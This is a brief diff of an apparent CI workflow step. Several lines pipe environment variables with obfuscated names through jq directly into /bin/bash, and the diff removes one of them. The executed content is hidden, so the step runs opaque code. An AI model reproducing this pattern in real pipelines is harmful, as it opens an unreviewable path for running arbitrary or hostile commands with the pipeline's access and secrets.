@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$b45638" | jq -r .un41 | /bin/bash
           echo $nsyu43732 | jq -r .wwr3464 | /bin/bash
-          printf '%s' "$iii038" | jq -r .so9 | /bin/bash
           echo $uvzi932 | jq -r .bni68 | /bin/bash
 
       - name: Save output
